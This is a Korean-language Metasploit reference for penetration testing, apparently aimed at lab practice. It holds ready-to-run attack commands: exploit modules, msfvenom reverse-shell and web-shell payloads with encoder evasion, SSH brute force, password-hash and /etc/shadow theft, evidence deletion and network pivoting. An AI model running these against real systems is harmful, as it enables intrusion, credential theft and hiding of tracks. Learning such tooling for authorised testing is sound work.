# Metasploit Framework 레퍼런스

## 개요

Metasploit Framework는 오픈소스 침투 테스트 프레임워크이다. 취약점 익스플로잇, 페이로드 생성, 포스트 익스플로잇 기능을 통합적으로 제공한다.

---

## 1. msfconsole 기본 명령

### 시작 및 기본 조작

```bash
# Metasploit 콘솔 실행
msfconsole

# 배너 없이 실행
msfconsole -q

# 데이터베이스 연결 확인
msf6> db_status

# 도움말
msf6> help
msf6> help search
```

### 모듈 검색 및 선택

```bash
# 키워드 검색
msf6> search apache
msf6> search type:exploit platform:linux apache

# 필터 옵션
msf6> search cve:2024
msf6> search name:smb type:exploit rank:excellent
msf6> search type:auxiliary name:scanner

# 모듈 사용
msf6> use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6> use 0          # 검색 결과 번호로 선택

# 모듈 정보 확인
msf6 exploit(...)> info
msf6 exploit(...)> show options
msf6 exploit(...)> show targets
msf6 exploit(...)> show payloads
msf6 exploit(...)> show advanced

# 모듈 해제
msf6 exploit(...)> back
```

### 옵션 설정 및 실행

```bash
# 필수 옵션 설정
msf6 exploit(...)> set RHOSTS 10.20.30.10
msf6 exploit(...)> set RPORT 80
msf6 exploit(...)> set LHOST 10.20.30.1
msf6 exploit(...)> set LPORT 4444
msf6 exploit(...)> set TARGETURI /cgi-bin/vulnerable.cgi

# 글로벌 설정 (모든 모듈에 적용)
msf6> setg RHOSTS 10.20.30.10
msf6> setg LHOST 10.20.30.1

# 페이로드 설정
msf6 exploit(...)> set PAYLOAD linux/x64/meterpreter/reverse_tcp

# 실행
msf6 exploit(...)> exploit       # 또는 run
msf6 exploit(...)> exploit -j    # 백그라운드 실행

# 옵션 확인
msf6 exploit(...)> show options
msf6 exploit(...)> show missing   # 미설정 필수 옵션
```

### 세션 관리

```bash
# 활성 세션 목록
msf6> sessions
msf6> sessions -l

# 세션 연결
msf6> sessions -i 1

# 세션 백그라운드
meterpreter> background    # 또는 Ctrl+Z

# 세션 종료
msf6> sessions -k 1        # 특정 세션 종료
msf6> sessions -K          # 모든 세션 종료

# 세션 업그레이드 (셸 → Meterpreter)
msf6> sessions -u 1
```

### 작업 (Jobs) 관리

```bash
msf6> jobs             # 실행 중인 작업
msf6> jobs -l          # 상세 목록
msf6> jobs -k 1        # 작업 종료
```

---

## 2. 모듈 유형

### exploit

취약점을 이용하여 대상 시스템에 접근한다.

```bash
# 원격 익스플로잇
use exploit/multi/http/apache_mod_cgi_bash_env_exec   # Shellshock
use exploit/unix/ftp/vsftpd_234_backdoor               # vsFTPd 백도어
use exploit/linux/http/apache_struts2_rce               # Struts2 RCE
use exploit/multi/http/tomcat_mgr_upload                # Tomcat Manager
use exploit/unix/webapp/drupal_drupalgeddon2            # Drupal RCE

# 로컬 익스플로잇 (권한 상승)
use exploit/linux/local/dirty_cow
use exploit/linux/local/sudo_baron_samedit
```

### auxiliary

정보 수집, 스캐닝, 퍼징 등 보조 도구이다.

```bash
# 포트 스캐너
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.20.30.0/24
set PORTS 22,80,443,3306,8080
run

# HTTP 디렉토리 열거
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.20.30.10
run

# SMB 열거
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_version

# SSH 브루트포스
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.20.30.10
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# 취약점 스캐너
use auxiliary/scanner/http/apache_optionsbleed
```

### post

익스플로잇 성공 후 포스트 익스플로잇 모듈이다.

```bash
# 시스템 정보 수집
use post/linux/gather/enum_system
set SESSION 1
run

# 네트워크 정보
use post/linux/gather/enum_network

# 자격 증명 수집
use post/linux/gather/hashdump

# 권한 상승 가능성 확인
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### payload

대상 시스템에서 실행할 코드이다.

```bash
# Staged (작은 스테이저 → 큰 페이로드 로드)
linux/x64/meterpreter/reverse_tcp     # Meterpreter (staged)
linux/x64/shell/reverse_tcp           # 셸 (staged)

# Stageless (단일 페이로드)
linux/x64/meterpreter_reverse_tcp     # Meterpreter (stageless)
linux/x64/shell_reverse_tcp           # 셸 (stageless)

# 바인드 (대상이 리스닝)
linux/x64/meterpreter/bind_tcp
```

---

## 3. msfvenom 페이로드 생성

### 기본 사용법

```bash
msfvenom -p <payload> [옵션] -f <형식> -o <출력파일>
```

### 주요 페이로드 생성

```bash
# Linux 리버스 셸 (ELF)
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.20.30.1 LPORT=4444 \
  -f elf -o reverse_shell

# Python 리버스 셸
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=10.20.30.1 LPORT=4444 \
  -f raw -o shell.py

# PHP 리버스 셸
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=10.20.30.1 LPORT=4444 \
  -f raw -o shell.php

# Windows 리버스 셸 (EXE)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.20.30.1 LPORT=4444 \
  -f exe -o payload.exe

# 웹 셸 (JSP)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.20.30.1 LPORT=4444 \
  -f raw -o shell.jsp

# Shellcode (C 형식)
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=10.20.30.1 LPORT=4444 \
  -f c
```

### 인코딩 및 회피

```bash
# 인코더 목록
msfvenom -l encoders

# 인코딩 적용
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.20.30.1 LPORT=4444 \
  -e x64/xor_dynamic -i 3 \
  -f elf -o encoded_shell

# 페이로드 목록
msfvenom -l payloads

# 출력 형식 목록
msfvenom -l formats
```

---

## 4. Meterpreter 명령어

### 시스템 정보

```bash
meterpreter> sysinfo              # 시스템 정보
meterpreter> getuid               # 현재 사용자
meterpreter> getpid               # 현재 프로세스 ID
meterpreter> ps                   # 프로세스 목록
meterpreter> ifconfig             # 네트워크 인터페이스
meterpreter> route                # 라우팅 테이블
meterpreter> arp                  # ARP 테이블
```

### 파일 시스템

```bash
meterpreter> pwd                  # 현재 디렉토리
meterpreter> ls                   # 파일 목록
meterpreter> cd /etc              # 디렉토리 이동
meterpreter> cat /etc/passwd      # 파일 읽기
meterpreter> download /etc/shadow /tmp/shadow   # 파일 다운로드
meterpreter> upload /tmp/tool.sh /tmp/          # 파일 업로드
meterpreter> edit /tmp/config.txt               # 파일 편집
meterpreter> mkdir /tmp/workdir                 # 디렉토리 생성
meterpreter> rm /tmp/evidence.txt               # 파일 삭제
meterpreter> search -d /var/www -f "*.conf"     # 파일 검색
```

### 네트워크

```bash
meterpreter> portfwd add -l 8080 -p 80 -r 10.20.30.20  # 포트 포워딩
meterpreter> portfwd list                                 # 포트 포워딩 목록
meterpreter> portfwd delete -l 8080                       # 포트 포워딩 삭제
```

### 셸 및 실행

```bash
meterpreter> shell                # 시스템 셸 실행
meterpreter> execute -f /bin/ls -a "-la /tmp"   # 명령 실행
meterpreter> run post/linux/gather/enum_system  # 포스트 모듈 실행
```

### 권한 상승

```bash
meterpreter> getsystem            # 권한 상승 시도
meterpreter> run post/multi/recon/local_exploit_suggester  # 제안
```

### 피봇팅 (Pivoting)

```bash
# 내부 네트워크 라우트 추가
meterpreter> run autoroute -s 10.20.30.0/24

# msf에서 SOCKS 프록시 설정
msf6> use auxiliary/server/socks_proxy
msf6 auxiliary(...)> set SRVPORT 1080
msf6 auxiliary(...)> run -j

# proxychains로 내부 네트워크 스캔
# /etc/proxychains.conf에 socks5 127.0.0.1 1080 추가
proxychains nmap -sT -Pn 10.20.30.0/24
```

---

## 5. 데이터베이스 연동

```bash
# PostgreSQL 초기화
msfdb init

# 데이터베이스 상태
msf6> db_status

# 호스트 관리
msf6> hosts                       # 발견된 호스트
msf6> hosts -a 10.20.30.10       # 호스트 추가

# 서비스
msf6> services                    # 발견된 서비스
msf6> services -p 80              # 포트 80 서비스

# 취약점
msf6> vulns                       # 발견된 취약점

# 자격 증명
msf6> creds                       # 수집된 자격 증명

# nmap 결과 가져오기
msf6> db_nmap -sV -sC 10.20.30.0/24
msf6> db_import scan_result.xml
```

---

## 6. 리스너 설정 (Handler)

```bash
# 멀티 핸들러 설정
msf6> use exploit/multi/handler
msf6 exploit(handler)> set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(handler)> set LHOST 10.20.30.1
msf6 exploit(handler)> set LPORT 4444
msf6 exploit(handler)> set ExitOnSession false   # 세션 후에도 계속 리스닝
msf6 exploit(handler)> exploit -j                 # 백그라운드 실행
```

---

## 7. 실습 예제

### 예제 1: 정보 수집 → 취약점 스캔 → 익스플로잇 워크플로우

```bash
# 1단계: 포트 스캔
msf6> db_nmap -sV -sC -T4 10.20.30.10

# 2단계: 발견된 서비스 확인
msf6> services -p 80,443

# 3단계: 취약점 검색
msf6> search type:exploit name:apache
msf6> vulns

# 4단계: 익스플로잇
msf6> use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(...)> set RHOSTS 10.20.30.10
msf6 exploit(...)> set TARGETURI /cgi-bin/test.cgi
msf6 exploit(...)> set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(...)> set LHOST 10.20.30.1
msf6 exploit(...)> exploit

# 5단계: 포스트 익스플로잇
meterpreter> sysinfo
meterpreter> run post/linux/gather/enum_system
meterpreter> run post/multi/recon/local_exploit_suggester
```

### 예제 2: SSH 브루트포스

```bash
msf6> use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(...)> set RHOSTS 10.20.30.10
msf6 auxiliary(...)> set USERNAME admin
msf6 auxiliary(...)> set PASS_FILE /usr/share/wordlists/common_passwords.txt
msf6 auxiliary(...)> set THREADS 5
msf6 auxiliary(...)> set STOP_ON_SUCCESS true
msf6 auxiliary(...)> run
```

### 예제 3: 웹 애플리케이션 스캔

```bash
msf6> use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(...)> set RHOSTS 10.20.30.10
msf6 auxiliary(...)> set RPORT 80
msf6 auxiliary(...)> run

msf6> use auxiliary/scanner/http/http_version
msf6 auxiliary(...)> set RHOSTS 10.20.30.10
msf6 auxiliary(...)> run
```

---

## 8. 리소스 스크립트 (자동화)

```bash
# 리소스 파일 생성 (auto_scan.rc)
cat > auto_scan.rc << 'EOF'
db_nmap -sV -sC -T4 10.20.30.0/24
use auxiliary/scanner/http/http_version
set RHOSTS 10.20.30.0/24
set THREADS 10
run
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 10.20.30.0/24
run
EOF

# 리소스 스크립트 실행
msfconsole -r auto_scan.rc

# 콘솔 내에서 실행
msf6> resource auto_scan.rc
```

---

## 참고

- 공식 문서: https://docs.metasploit.com
- 모듈 데이터베이스: https://www.rapid7.com/db/modules/
- ExploitDB: https://www.exploit-db.com
